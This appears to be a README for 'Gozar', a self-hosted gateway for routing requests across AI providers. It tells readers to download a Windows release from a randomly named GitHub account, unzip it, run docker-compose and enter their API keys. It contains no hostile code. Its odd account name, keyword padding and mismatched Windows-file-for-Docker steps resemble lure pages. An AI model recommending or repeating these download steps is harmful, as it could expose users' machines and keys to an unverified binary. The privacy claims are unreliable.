# 🌐 Gozar - Manage multiple AI models with ease

[![Download Gozar](https://img.shields.io/badge/Download-Gozar-blue.svg)](https://github.com/Soilbuilding-libraryroutine78/Gozar)

Gozar acts as a central hub for your artificial intelligence tools. It connects different AI providers into one simple interface. You use this software to route your requests, manage costs, and keep your data organized. It removes the complexity of switching between multiple services. You gain control over your AI usage through a single portal.

## ⚙️ System requirements

Your computer needs specific components to run this software. Ensure you meet these requirements before you start:

- Windows 10 or Windows 11.
- At least 8 gigabytes of RAM.
- A stable internet connection.
- A modern web browser like Chrome, Firefox, or Edge.
- Docker Desktop installed on your machine.

## 📥 Get the software

You must visit the project page to download the latest version. Follow these steps to obtain the installer:

1. Visit [https://github.com/Soilbuilding-libraryroutine78/Gozar](https://github.com/Soilbuilding-libraryroutine78/Gozar).
2. Look for the Releases section on the right side of the page.
3. Select the latest version link.
4. Download the file labeled for Windows.
5. Save the file to your computer.

## 🚀 Setting up the application

Follow these instructions to start Gozar on your machine:

1. Open Docker Desktop after the installation finishes.
2. Locate the file you downloaded.
3. Unzip the folder to a secure location on your computer.
4. Use the command prompt or a terminal window to navigate to the folder.
5. Run the command "docker-compose up" to start the services.
6. Wait for the process to finish loading all components.
7. Open your web browser once the process remains active.
8. Type "localhost:8080" in the address bar to access the dashboard.

## 🛠️ Using the gateway

The dashboard provides a visual interface to manage your AI connections. You input your API keys from providers like OpenAI or Anthropic into the settings menu. Gozar stores these keys locally. You now use the Gozar address as your primary gateway for any application that requires an AI connection. It automatically routes your requests to the service you choose.

## 🛡️ Managing your usage

You monitor your traffic directly through the dashboard. The application tracks every request sent through the gateway. You see data on how many times you contact a specific model. This helps you track spending and monitor performance. If one service goes offline, the software uses a backup provider to finish your task without interruption.

## 💡 Frequently asked questions

**Do I need a paid subscription to use this?**
The software is free to use. You still need to pay for the individual AI services you connect through your API keys.

**Does Gozar store my personal data?**
All data stays on your local machine. The software acts as a tunnel for your information. It does not send your data to external servers outside of the AI providers you select.

**How do I update the software?**
Visit the download link again to find newer versions. Follow the setup steps to replace your old files with the latest ones.

**Can I use this with multiple AI providers?**
Yes. You input as many keys from different providers as you need. The software handles the connections for all of them simultaneously.

**What happens if my internet disconnects?**
The service stops until your internet returns. Because the software runs locally on your computer, your previous settings remain unchanged.

**Is my API key safe?**
The software includes encryption for local storage. Keep your computer secure to protect your sensitive keys.

Keywords: ai-gateway, anthropic-api, api-gateway, api-proxy, fallback-routing, fastapi, langchain, langgraph, llm, llm-gateway, llm-multi-provider, llm-observability, llmops, model-routing, multi-provider, openai-api, openai-codex, openllm, openrouter, self-hosted